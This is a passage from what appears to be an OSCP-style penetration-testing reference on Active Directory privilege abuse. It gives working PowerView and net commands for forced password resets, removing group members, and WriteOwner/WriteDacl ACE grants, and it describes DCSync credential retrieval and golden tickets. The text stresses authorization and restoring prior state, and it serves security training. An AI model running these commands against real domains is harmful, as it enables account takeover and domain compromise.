Golden tickets require the KRBTGT key and domain SID and create a forged TGT. They are a high-impact persistence concept covered in the [conditional domain-compromise section](https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise.md#conditional-high-impact-ticket-forging-concepts), not a default Block 11 action.

methods.procedure:
A password-reset right creates a new password credential; it does not reveal the old one. This is disruptive because an unknown original password cannot be restored.

```powershell
$Secure = ConvertTo-SecureString 'TEMP_PASSWORD' -AsPlainText -Force
Set-DomainUserPassword -Identity TARGET_USER -AccountPassword $Secure -Verbose
net user TARGET_USER TEMP_PASSWORD /domain
```

Validate the account state and authenticate only to an approved service as the target identity. Prefer a reversible route when one exists.


```powershell
Remove-DomainGroupMember -Identity TARGET_GROUP -Members CONTROLLED_USER -Verbose -Confirm:$false
net group TARGET_GROUP CONTROLLED_USER /delete /domain
```

recognition.spot: Ownership/DACL control may enable a narrower useful ACE; it is an intermediate capability.

methods.procedure:
`WriteOwner` can make the controlled identity the owner; ownership may then permit a DACL change. `WriteDacl` can grant only the narrower right needed for the intended transition.

```powershell
Set-DomainObjectOwner -Identity TARGET_OBJECT -OwnerIdentity CONTROLLED_USER -Verbose
Add-DomainObjectAcl -TargetIdentity TARGET_OBJECT -PrincipalIdentity CONTROLLED_USER -Rights ResetPassword -Verbose

# Group-membership variant
Add-DomainObjectAcl -TargetIdentity TARGET_GROUP -PrincipalIdentity CONTROLLED_USER -Rights WriteMembers -Verbose

# Remove the ACE after the authorized objective
Remove-DomainObjectAcl -TargetIdentity TARGET_OBJECT -PrincipalIdentity CONTROLLED_USER -Rights ResetPassword -Verbose
```

Export the original owner/security descriptor before changing it and restore exactly that state. Password resets, membership changes, SPN writes, ownership changes and ACE grants are state changes; do not execute merely because a graph shows an edge.

methods.result: Selected domain credential material retrieved through directory replication
methods.mechanics: DCSync uses the replication protocol instead of reading a local LSASS process or copying NTDS. Its authorization comes from domain replication rights, not an arbitrary local administrator token.
methods.example: Observation: a controlled identity has the required domain replication rights. Test: verify effective rights and request only the selected proof account through the documented mechanism. Illustrative output: that account's credential material returns. Interpretation: classify and retain it privately.
methods.verify: Verify the replication source, account and material type; avoid equating a tool label with proven rights.
